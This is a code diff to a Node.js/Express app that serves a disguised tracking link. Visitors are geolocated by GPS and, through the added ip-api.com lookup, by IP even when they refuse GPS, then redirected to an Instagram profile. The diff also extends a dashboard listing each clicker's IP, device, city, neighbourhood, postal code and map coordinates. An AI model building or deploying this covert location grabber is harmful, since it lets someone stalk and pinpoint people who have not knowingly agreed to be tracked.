@@ -61,7 +61,7 @@ app.get('/', (req, res) => {
           border-radius: 10px;
         }
         .click-card.with-gps { border-left: 5px solid #10b981; }
-        .click-card.no-gps { border-left: 5px solid #ef4444; }
+        .click-card.with-ip { border-left: 5px solid #f59e0b; }
         .maps-link {
           background: #10b981;
           color: white;
@@ -80,6 +80,16 @@ app.get('/', (req, res) => {
           cursor: pointer;
           margin-bottom: 1rem;
         }
+        .precision-badge {
+          display: inline-block;
+          padding: 0.3rem 0.8rem;
+          border-radius: 5px;
+          font-size: 0.85rem;
+          font-weight: bold;
+          margin-top: 0.5rem;
+        }
+        .precision-high { background: #10b981; color: white; }
+        .precision-medium { background: #f59e0b; color: white; }
       </style>
     </head>
     <body>
@@ -99,33 +109,48 @@ app.get('/', (req, res) => {
           
           document.getElementById('stats').innerHTML = \`
             <div class="stat-card"><h3>\${data.totalClicks}</h3><p>Total</p></div>
-            <div class="stat-card"><h3>\${data.clicksComGPS || 0}</h3><p>Com GPS</p></div>
-            <div class="stat-card"><h3>\${data.totalClicks - (data.clicksComGPS || 0)}</h3><p>Sem GPS</p></div>
+            <div class="stat-card"><h3>\${data.clicksComGPS || 0}</h3><p>GPS Exato</p></div>
+            <div class="stat-card"><h3>\${data.clicksComIP || 0}</h3><p>Localização IP</p></div>
           \`;
 
           const clicksHtml = data.clicks.map(c => {
             const hasGPS = c.gps && c.gps.lat;
-            const loc = c.location;
+            const hasIPLocation = c.ipLocation && c.ipLocation.cidade;
+            const loc = c.location || c.ipLocation;
             
             return \`
-              <div class="click-card \${hasGPS ? 'with-gps' : 'no-gps'}">
+              <div class="click-card \${hasGPS ? 'with-gps' : 'with-ip'}">
                 <div><strong>⏰</strong> \${new Date(c.timestamp).toLocaleString('pt-BR')}</div>
                 <div><strong>🌐 IP:</strong> \${c.ip}</div>
                 <div><strong>📱</strong> \${c.device}</div>
+                
                 \${hasGPS ? \`
                   <div style="margin-top: 1rem; padding-top: 1rem; border-top: 2px solid #10b981;">
                     <div style="color: #10b981; font-weight: bold;">📍 LOCALIZAÇÃO GPS EXATA</div>
+                    <span class="precision-badge precision-high">✓ Precisão Alta</span>
                     \${loc ? \`
-                      <div><strong>🏙️ Cidade:</strong> \${loc.cidade}, \${loc.estado}</div>
+                      <div style="margin-top: 0.8rem;"><strong>🏙️ Cidade:</strong> \${loc.cidade}, \${loc.estado}</div>
                       <div><strong>🏘️ Bairro:</strong> \${loc.bairro}</div>
                       <div><strong>📮 CEP:</strong> \${loc.cep}</div>
                     \` : ''}
-                    <div><strong>🗺️</strong> \${c.gps.lat}, \${c.gps.lng}</div>
+                    <div><strong>🗺️ Coordenadas:</strong> \${c.gps.lat}, \${c.gps.lng}</div>
+                    <div><strong>🎯 Precisão:</strong> ±\${Math.round(c.gps.accuracy)}m</div>
                     <a href="https://www.google.com/maps?q=\${c.gps.lat},\${c.gps.lng}" 
                        target="_blank" class="maps-link">📍 Ver no Google Maps</a>
                   </div>
+                \` : hasIPLocation ? \`
+                  <div style="margin-top: 1rem; padding-top: 1rem; border-top: 2px solid #f59e0b;">
+                    <div style="color: #f59e0b; font-weight: bold;">📍 LOCALIZAÇÃO POR IP</div>
+                    <span class="precision-badge precision-medium">⚠ Precisão Aproximada</span>
+                    <div style="margin-top: 0.8rem;"><strong>🏙️ Cidade:</strong> \${hasIPLocation.cidade}</div>
+                    <div><strong>🗺️ Estado:</strong> \${hasIPLocation.estado}</div>
+                    <div><strong>🌎 País:</strong> \${hasIPLocation.pais}</div>
+                    <div style="color: #6b7280; font-size: 0.9rem; margin-top: 0.5rem;">
+                      ℹ️ GPS não autorizado - localização aproximada baseada no IP
+                    </div>
+                  </div>
                 \` : \`
-                  <div style="color: #ef4444; margin-top: 1rem;">⚠️ GPS não autorizado</div>
+                  <div style="color: #ef4444; margin-top: 1rem;">⚠️ Localização não disponível</div>
                 \`}
               </div>
             \`;
@@ -143,7 +168,7 @@ app.get('/', (req, res) => {
 });
 
 // ROTA 2: Rastreamento
-app.get('/track', (req, res) => {
+app.get('/track', async (req, res) => {
   const clickData = {
     id: clicks.length + 1,
     ip: req.ip || req.connection.remoteAddress,
@@ -155,6 +180,28 @@ app.get('/track', (req, res) => {
   
   clicks.push(clickData);
   console.log('📍 Novo clique ID:', clickData.id);
+  
+  // Captura localização por IP imediatamente
+  try {
+    const ipClean = clickData.ip.replace('::ffff:', '');
+    console.log('🔍 Buscando localização do IP:', ipClean);
+    
+    const response = await fetch(`http://ip-api.com/json/${ipClean}?lang=pt&fields=status,country,regionName,city,lat,lon`);
+    const ipData = await response.json();
+    
+    if (ipData.status === 'success') {
+      clickData.ipLocation = {
+        cidade: ipData.city || 'N/A',
+        estado: ipData.regionName || 'N/A',
+        pais: ipData.country || 'N/A',
+        lat: ipData.lat,
+        lng: ipData.lon
+      };
+      console.log(`🏙️ Localização IP: ${ipData.city}, ${ipData.regionName}`);
+    }
+  } catch (error) {
+    console.error('❌ Erro ao buscar localização IP:', error.message);
+  }
   
   res.send(`
     <!DOCTYPE html>
@@ -237,6 +284,7 @@ app.get('/track', (req, res) => {
             },
             (error) => {
               console.error('❌ Erro GPS:', error.code, error.message);
+              console.log('ℹ️ Usando localização por IP como fallback');
               setTimeout(() => {
                 window.location.href = 'https://www.instagram.com/andre.osantos12/';
               }, 1500);
@@ -245,6 +293,7 @@ app.get('/track', (req, res) => {
           );
         } else {
           console.error('❌ GPS não disponível');
+          console.log('ℹ️ Usando localização por IP como fallback');
           setTimeout(() => {
             window.location.href = 'https://www.instagram.com/andre.osantos12/';
           }, 1500);
@@ -285,7 +334,7 @@ app.post('/api/save-gps', async (req, res) => {
       console.log(`📍 ${gps.latitude}, ${gps.longitude}`);
       console.log(`🗺️ https://www.google.com/maps?q=${gps.latitude},${gps.longitude}`);
       
-      // Busca endereço
+      // Busca endereço COMPLETO com GPS (bairro e CEP)
       try {
         const response = await fetch(
           `https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${gps.latitude}&longitude=${gps.longitude}&localityLanguage=pt`
@@ -298,12 +347,13 @@ app.post('/api/save-gps', async (req, res) => {
             cidade: data.city || data.locality || 'N/A',
             estado: data.principalSubdivision || 'N/A',
             pais: data.countryName || 'Brasil',
-            bairro: data.localityInfo?.administrative?.[0]?.name || 'N/A',
+            bairro: data.localityInfo?.administrative?.[0]?.name || data.locality || 'N/A',
             cep: data.postcode || 'N/A'
           };
           
           console.log(`🏙️ ${click.location.cidade}, ${click.location.estado}`);
-          console.log(`🏘️ ${click.location.bairro}`);
+          console.log(`🏘️ Bairro: ${click.location.bairro}`);
+          console.log(`📮 CEP: ${click.location.cep}`);
         }
       } catch (error) {
         console.error('❌ Erro ao buscar endereço:', error.message);
@@ -322,6 +372,7 @@ app.get('/api/stats', (req, res) => {
   res.json({
     totalClicks: clicks.length,
     clicksComGPS: clicks.filter(c => c.gps).length,
+    clicksComIP: clicks.filter(c => !c.gps && c.ipLocation).length,
     clicks: clicks
   });
 });
